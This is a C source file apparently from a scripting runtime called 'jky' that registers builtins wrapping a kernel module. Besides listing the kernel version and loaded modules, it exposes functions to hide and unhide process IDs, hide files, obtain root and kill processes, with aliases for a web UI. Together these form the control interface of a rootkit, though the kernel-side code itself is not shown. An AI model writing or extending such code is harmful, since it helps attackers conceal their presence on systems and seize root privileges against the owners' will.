#include "jky_builtins.h"
#include "jky_kernel_bridge.h"
#include "jky_platform.h"

#include <stdio.h>
#include <string.h>

static BuiltinResult bi_kernel_version(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)a; (void)c;
    char buf[256] = {0};
    jky_kernel_version(buf, sizeof(buf));
    *out = mkstr(buf);
    return BUILTIN_OK;
}

static BuiltinResult bi_kernel_modules(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)a; (void)c;
    Value arr = mkarray();
    FILE *f = fopen("/proc/modules", "r");
    if (f) {
        char line[512];
        while (fgets(line, sizeof(line), f)) {
            char *sp = strchr(line, ' ');
            if (sp) *sp = 0;
            arr_push(arr.v.arr, mkstr(line));
        }
        fclose(f);
    }
    *out = arr;
    return BUILTIN_OK;
}

static BuiltinResult bi_hide_pid(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)c;
    if (a[0].type != VT_INT) { *out = mkbool(0); return BUILTIN_OK; }
    *out = mkbool(jky_kmod_hide_pid((int)a[0].v.i) == 0);
    return BUILTIN_OK;
}

static BuiltinResult bi_unhide_pid(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)c;
    if (a[0].type != VT_INT) { *out = mkbool(0); return BUILTIN_OK; }
    *out = mkbool(jky_kmod_unhide_pid((int)a[0].v.i) == 0);
    return BUILTIN_OK;
}

static BuiltinResult bi_hide_file(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)c;
    if (a[0].type != VT_STR) { *out = mkbool(0); return BUILTIN_OK; }
    *out = mkbool(jky_kmod_hide_file(a[0].v.s) == 0);
    return BUILTIN_OK;
}

static BuiltinResult bi_get_root(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)a; (void)c;
    *out = mkbool(jky_kmod_get_root() == 0);
    return BUILTIN_OK;
}

static BuiltinResult bi_kill_pid(VM *vm, Value *a, int c, Value *out) {
    (void)vm; (void)c;
    if (a[0].type != VT_INT) { *out = mkbool(0); return BUILTIN_OK; }
    *out = mkbool(jky_kmod_kill((int)a[0].v.i) == 0);
    return BUILTIN_OK;
}

const Builtin BUILTINS_KERNEL[] = {
    { "kernel_version",     0, 0, bi_kernel_version },
    { "kernel_modules",     0, 0, bi_kernel_modules },
    { "kernel_hide_pid",    1, 1, bi_hide_pid       },
    { "kernel_unhide_pid",  1, 1, bi_unhide_pid     },
    { "kernel_hide_file",   1, 1, bi_hide_file      },
    { "kernel_get_root",    0, 0, bi_get_root       },
    { "kernel_kill_pid",    1, 1, bi_kill_pid       },
    /* web UI aliases */
    { "hide_pid",   1, 1, bi_hide_pid   },
    { "unhide_pid", 1, 1, bi_unhide_pid },
    { "hide_file",  1, 1, bi_hide_file  },
    { "get_root",   0, 0, bi_get_root   },
    { "kill_pid",   1, 1, bi_kill_pid   },
    { NULL, 0, 0, NULL },
};
